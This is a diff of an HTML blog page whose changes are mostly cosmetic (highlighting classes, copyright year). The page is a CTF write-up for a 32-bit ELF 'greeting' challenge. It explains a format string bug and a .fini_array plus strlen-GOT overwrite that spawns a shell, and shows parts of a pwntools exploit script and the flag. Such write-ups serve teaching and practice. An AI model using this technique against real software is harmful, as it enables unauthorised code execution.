@@ -306,22 +306,22 @@
 
 <p>After a long period of time without playing any CTF, I finally finished my master’s degree and have time to enjoy some CTF challenges. And then there is the <strong>Tokyo Western/MMA 2nd CTF</strong>, the first CTF I played in 2016.</p>
 
-<p>The challenge gave us a 32 bit ELF. The program will first use <code class="highlighter-rouge">system</code> to echo some message, then it will ask us to input our name, and print the greeting message. We can see that there exist a format string vulnerability in the main function:</p>
+<p>The challenge gave us a 32 bit ELF. The program will first use <code class="language-plaintext highlighter-rouge">system</code> to echo some message, then it will ask us to input our name, and print the greeting message. We can see that there exist a format string vulnerability in the main function:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2
-</span>    <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// edx@4
-</span>    <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-84h]@2
-</span>    <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+5Ch] [bp-44h]@1
-</span>    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+9Ch] [bp-4h]@1
-</span>
+    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2</span>
+    <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// edx@4</span>
+    <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-84h]@2</span>
+    <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+5Ch] [bp-44h]@1</span>
+    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+9Ch] [bp-4h]@1</span>
+
     <span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Please tell me your name... "</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">getnline</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="p">)</span>
     <span class="p">{</span>
         <span class="n">sprintf</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="s">"Nice to meet you, %s :)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
-        <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span> <span class="c1">// &lt;-- format string 
-</span>    <span class="p">}</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span> <span class="c1">// &lt;-- format string </span>
+    <span class="p">}</span>
     <span class="k">else</span>
     <span class="p">{</span>
         <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Don't ignore me ;( "</span><span class="p">);</span>
@@ -331,17 +331,17 @@
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>As we can see that the program ends directly after it print out the greeting message, so it’s kind of hard for us to do the GOT hijacking attack. After discussing with my teammate, we found that there’s one more place we can overwrite the function pointer: <strong>the <code class="highlighter-rouge">.fini_array</code> section</strong>.</p>
+<p>As we can see that the program ends directly after it print out the greeting message, so it’s kind of hard for us to do the GOT hijacking attack. After discussing with my teammate, we found that there’s one more place we can overwrite the function pointer: <strong>the <code class="language-plaintext highlighter-rouge">.fini_array</code> section</strong>.</p>
 
-<p>So, we can first overwrite the <strong>first entry</strong> of the <code class="highlighter-rouge">.fini_array</code> section and hijack the control flow. Notice that we can only input 64 bytes characters, and that’s kind of hard for us to write both <code class="highlighter-rouge">system</code>’s address and <code class="highlighter-rouge">sh</code>’s string into the memory buffer. Here’s what we can do :</p>
+<p>So, we can first overwrite the <strong>first entry</strong> of the <code class="language-plaintext highlighter-rouge">.fini_array</code> section and hijack the control flow. Notice that we can only input 64 bytes characters, and that’s kind of hard for us to write both <code class="language-plaintext highlighter-rouge">system</code>’s address and <code class="language-plaintext highlighter-rouge">sh</code>’s string into the memory buffer. Here’s what we can do :</p>
 
 <ul>
-  <li>Overwrite both <code class="highlighter-rouge">.fini_array</code> section and <code class="highlighter-rouge">strlen</code>’s GOT entry. We replace the first entry of the <code class="highlighter-rouge">.fini_array</code> section into <strong>main function’s address</strong>, while <code class="highlighter-rouge">strlen</code>’s GOT entry be changed into <code class="highlighter-rouge">system</code>’s PLT.</li>
-  <li>The program will then return to the main function. Since <code class="highlighter-rouge">strlen</code>’s GOT has already been changed into <code class="highlighter-rouge">system</code>’s address, we can then input <code class="highlighter-rouge">sh</code> and execute <code class="highlighter-rouge">system("sh")</code> during the <code class="highlighter-rouge">getnline</code> function (the function will call <code class="highlighter-rouge">strlen</code> on our input).</li>
+  <li>Overwrite both <code class="language-plaintext highlighter-rouge">.fini_array</code> section and <code class="language-plaintext highlighter-rouge">strlen</code>’s GOT entry. We replace the first entry of the <code class="language-plaintext highlighter-rouge">.fini_array</code> section into <strong>main function’s address</strong>, while <code class="language-plaintext highlighter-rouge">strlen</code>’s GOT entry be changed into <code class="language-plaintext highlighter-rouge">system</code>’s PLT.</li>
+  <li>The program will then return to the main function. Since <code class="language-plaintext highlighter-rouge">strlen</code>’s GOT has already been changed into <code class="language-plaintext highlighter-rouge">system</code>’s address, we can then input <code class="language-plaintext highlighter-rouge">sh</code> and execute <code class="language-plaintext highlighter-rouge">system("sh")</code> during the <code class="language-plaintext highlighter-rouge">getnline</code> function (the function will call <code class="language-plaintext highlighter-rouge">strlen</code> on our input).</li>
 </ul>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -352,13 +352,13 @@
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./greeting"</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+<span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 
@@ -415,8 +415,8 @@
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-
+    <span class="c1">#r = process(ELF_PATH)
+</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="s">"AA"</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x08049934</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strlen'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strlen'</span><span class="p">]</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> 
     <span class="n">prints</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">18</span>
     <span class="n">payload</span><span class="p">,</span> <span class="n">prints</span> <span class="o">=</span> <span class="n">fmtstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">prints</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mh">0x85ed</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
@@ -431,7 +431,7 @@
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}</code></p>
 
         
       </section>
@@ -536,7 +536,6 @@
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -556,7 +555,6 @@
 
         
           
-          
 
 
 
@@ -575,7 +573,6 @@
 </div>
 
         
-          
           
 
 
@@ -598,7 +595,6 @@
 
         
           
-          
 
 
 
@@ -619,6 +615,7 @@
         
       </div>
     </div>
+  
   
 </div>
 
@@ -669,7 +666,7 @@
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
